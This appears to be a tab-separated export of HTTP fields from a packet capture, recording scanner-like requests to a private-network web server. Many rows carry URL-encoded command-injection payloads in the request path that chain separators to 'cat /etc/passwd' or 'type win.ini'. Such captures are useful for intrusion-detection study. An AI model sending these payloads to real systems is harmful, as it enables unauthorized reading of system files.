http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
																			18	18	application/x-www-form-urlencoded						192.168.1.104									43336						1	http://192.168.1.104/web/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web/
																			93	93	application/x-www-form-urlencoded						192.168.1.104									43338						1	http://192.168.1.104/web/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web/
																			20	20	application/x-www-form-urlencoded						192.168.1.104									43351						1	http://192.168.1.104/web/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web/
																			99	99	application/x-www-form-urlencoded						192.168.1.104									43358						1	http://192.168.1.104/web/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web/
																			20	20	application/x-www-form-urlencoded						192.168.1.104									43392						1	http://192.168.1.104/web/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web/
																			99	99	application/x-www-form-urlencoded						192.168.1.104									43401						1	http://192.168.1.104/web/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web/
																			22	22	application/x-www-form-urlencoded						192.168.1.104									43376						1	http://192.168.1.104/web/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web/
																			105	105	application/x-www-form-urlencoded						192.168.1.104									43385						1	http://192.168.1.104/web/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web/
																			22	22	application/x-www-form-urlencoded						192.168.1.104									43369						1	http://192.168.1.104/web/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web/
																											192.168.1.104									43413						1	http://192.168.1.104/web/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web/
																			18	18	application/x-www-form-urlencoded						192.168.1.104									43411						1	http://192.168.1.104/web/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web/
																											192.168.1.104									43409						1	http://192.168.1.104/web		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web
																			105	105	application/x-www-form-urlencoded						192.168.1.104									43415						1	http://192.168.1.104/web/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web/
																			18	18	application/x-www-form-urlencoded						192.168.1.104									43440						1	http://192.168.1.104/web/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web/
																			93	93	application/x-www-form-urlencoded						192.168.1.104									43447						1	http://192.168.1.104/web/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web/
																											192.168.1.104									43454						1	http://192.168.1.104/%20%252fbin%252fcat%20%252fetc%252fpasswd/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%20%252fbin%252fcat%20%252fetc%252fpasswd/
																			18	18	application/x-www-form-urlencoded						192.168.1.104									43458						1	http://192.168.1.104/%20%252fbin%252fcat%20%252fetc%252fpasswd/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%20%252fbin%252fcat%20%252fetc%252fpasswd/
																											192.168.1.104									43465						1	http://192.168.1.104/%20%252fbin%252fcat%20%252fetc%252fpasswd		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%20%252fbin%252fcat%20%252fetc%252fpasswd
																			16	16	application/x-www-form-urlencoded						192.168.1.104									43473						1	http://192.168.1.104/web/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web/
																			87	87	application/x-www-form-urlencoded						192.168.1.104									43480						1	http://192.168.1.104/web/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web/
																											192.168.1.104									43483						1	http://192.168.1.104/%20type%20%25SYSTEMROOT%25%5cwin.ini/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%20type%20%25SYSTEMROOT%25%5cwin.ini/
																			18	18	application/x-www-form-urlencoded						192.168.1.104									43485						1	http://192.168.1.104/%20type%20%25SYSTEMROOT%25%5cwin.ini/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%20type%20%25SYSTEMROOT%25%5cwin.ini/
																											192.168.1.104									43489						1	http://192.168.1.104/%20type%20%25SYSTEMROOT%25%5cwin.ini		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%20type%20%25SYSTEMROOT%25%5cwin.ini
																											192.168.1.104									43503						1	http://192.168.1.104/%26%26%20%252fbin%252fcat%20%252fetc%252fpasswd/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%26%26%20%252fbin%252fcat%20%252fetc%252fpasswd/
																			18	18	application/x-www-form-urlencoded						192.168.1.104									43506						1	http://192.168.1.104/%26%26%20%252fbin%252fcat%20%252fetc%252fpasswd/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%26%26%20%252fbin%252fcat%20%252fetc%252fpasswd/
																											192.168.1.104									43508						1	http://192.168.1.104/%26%26%20%252fbin%252fcat%20%252fetc%252fpasswd		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%26%26%20%252fbin%252fcat%20%252fetc%252fpasswd
																											192.168.1.104									43511						1	http://192.168.1.104/%26%26%20type%20%25SYSTEMROOT%25%5cwin.ini/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%26%26%20type%20%25SYSTEMROOT%25%5cwin.ini/
																			18	18	application/x-www-form-urlencoded						192.168.1.104									43513						1	http://192.168.1.104/%26%26%20type%20%25SYSTEMROOT%25%5cwin.ini/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%26%26%20type%20%25SYSTEMROOT%25%5cwin.ini/
																											192.168.1.104									43514						1	http://192.168.1.104/%26%26%20type%20%25SYSTEMROOT%25%5cwin.ini		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%26%26%20type%20%25SYSTEMROOT%25%5cwin.ini
																											192.168.1.104									43517						1	http://192.168.1.104/%7c%20%252fbin%252fcat%20%252fetc%252fpasswd/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%7c%20%252fbin%252fcat%20%252fetc%252fpasswd/
																			18	18	application/x-www-form-urlencoded						192.168.1.104									43520						1	http://192.168.1.104/%7c%20%252fbin%252fcat%20%252fetc%252fpasswd/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%7c%20%252fbin%252fcat%20%252fetc%252fpasswd/
																											192.168.1.104									43522						1	http://192.168.1.104/%7c%20%252fbin%252fcat%20%252fetc%252fpasswd		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%7c%20%252fbin%252fcat%20%252fetc%252fpasswd
																											192.168.1.104									43525						1	http://192.168.1.104/%7c%20type%20%25SYSTEMROOT%25%5cwin.ini/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%7c%20type%20%25SYSTEMROOT%25%5cwin.ini/
																			18	18	application/x-www-form-urlencoded						192.168.1.104									43527						1	http://192.168.1.104/%7c%20type%20%25SYSTEMROOT%25%5cwin.ini/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%7c%20type%20%25SYSTEMROOT%25%5cwin.ini/
																											192.168.1.104									43529						1	http://192.168.1.104/%7c%20type%20%25SYSTEMROOT%25%5cwin.ini		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%7c%20type%20%25SYSTEMROOT%25%5cwin.ini
																											192.168.1.104									43532						1	http://192.168.1.104/%3b%20%252fbin%252fcat%20%252fetc%252fpasswd/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%3b%20%252fbin%252fcat%20%252fetc%252fpasswd/
																			18	18	application/x-www-form-urlencoded						192.168.1.104									43534						1	http://192.168.1.104/%3b%20%252fbin%252fcat%20%252fetc%252fpasswd/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%3b%20%252fbin%252fcat%20%252fetc%252fpasswd/
																											192.168.1.104									43536						1	http://192.168.1.104/%3b%20%252fbin%252fcat%20%252fetc%252fpasswd		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%3b%20%252fbin%252fcat%20%252fetc%252fpasswd
																											192.168.1.104									43538						1	http://192.168.1.104/%3b%20type%20%25SYSTEMROOT%25%5cwin.ini/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%3b%20type%20%25SYSTEMROOT%25%5cwin.ini/
																			18	18	application/x-www-form-urlencoded						192.168.1.104									43541						1	http://192.168.1.104/%3b%20type%20%25SYSTEMROOT%25%5cwin.ini/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%3b%20type%20%25SYSTEMROOT%25%5cwin.ini/
																											192.168.1.104									43543						1	http://192.168.1.104/%3b%20type%20%25SYSTEMROOT%25%5cwin.ini		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%3b%20type%20%25SYSTEMROOT%25%5cwin.ini
																											192.168.1.104									43546						1	http://192.168.1.104/%20%60%252fbin%252fcat%20%252fetc%252fpasswd%60/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%20%60%252fbin%252fcat%20%252fetc%252fpasswd%60/
																			18	18	application/x-www-form-urlencoded						192.168.1.104									43548						1	http://192.168.1.104/%20%60%252fbin%252fcat%20%252fetc%252fpasswd%60/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%20%60%252fbin%252fcat%20%252fetc%252fpasswd%60/
																											192.168.1.104									43549						1	http://192.168.1.104/%20%60%252fbin%252fcat%20%252fetc%252fpasswd%60		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%20%60%252fbin%252fcat%20%252fetc%252fpasswd%60
																											192.168.1.104									43553						1	http://192.168.1.104/%20run%20type%20%25SYSTEMROOT%25%5cwin.ini/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%20run%20type%20%25SYSTEMROOT%25%5cwin.ini/
																			18	18	application/x-www-form-urlencoded						192.168.1.104									43555						1	http://192.168.1.104/%20run%20type%20%25SYSTEMROOT%25%5cwin.ini/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%20run%20type%20%25SYSTEMROOT%25%5cwin.ini/
																											192.168.1.104									43558						1	http://192.168.1.104/%20run%20type%20%25SYSTEMROOT%25%5cwin.ini		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%20run%20type%20%25SYSTEMROOT%25%5cwin.ini
																											192.168.1.104									43559						1	http://192.168.1.104/web%20%252fbin%252fcat%20%252fetc%252fpasswd/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%20%252fbin%252fcat%20%252fetc%252fpasswd/
																			18	18	application/x-www-form-urlencoded						192.168.1.104									43562						1	http://192.168.1.104/web%20%252fbin%252fcat%20%252fetc%252fpasswd/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%20%252fbin%252fcat%20%252fetc%252fpasswd/
																											192.168.1.104									43565						1	http://192.168.1.104/web%20%252fbin%252fcat%20%252fetc%252fpasswd		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%20%252fbin%252fcat%20%252fetc%252fpasswd
																											192.168.1.104									43567						1	http://192.168.1.104/web%20type%20%25SYSTEMROOT%25%5cwin.ini/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%20type%20%25SYSTEMROOT%25%5cwin.ini/
																			18	18	application/x-www-form-urlencoded						192.168.1.104									43569						1	http://192.168.1.104/web%20type%20%25SYSTEMROOT%25%5cwin.ini/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%20type%20%25SYSTEMROOT%25%5cwin.ini/
																											192.168.1.104									43571						1	http://192.168.1.104/web%20type%20%25SYSTEMROOT%25%5cwin.ini		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%20type%20%25SYSTEMROOT%25%5cwin.ini
																											192.168.1.104									43573						1	http://192.168.1.104/web%26%26%20%252fbin%252fcat%20%252fetc%252fpasswd/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%26%26%20%252fbin%252fcat%20%252fetc%252fpasswd/
																			18	18	application/x-www-form-urlencoded						192.168.1.104									43576						1	http://192.168.1.104/web%26%26%20%252fbin%252fcat%20%252fetc%252fpasswd/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%26%26%20%252fbin%252fcat%20%252fetc%252fpasswd/
																											192.168.1.104									43578						1	http://192.168.1.104/web%26%26%20%252fbin%252fcat%20%252fetc%252fpasswd		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%26%26%20%252fbin%252fcat%20%252fetc%252fpasswd
																											192.168.1.104									43580						1	http://192.168.1.104/web%26%26%20type%20%25SYSTEMROOT%25%5cwin.ini/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%26%26%20type%20%25SYSTEMROOT%25%5cwin.ini/
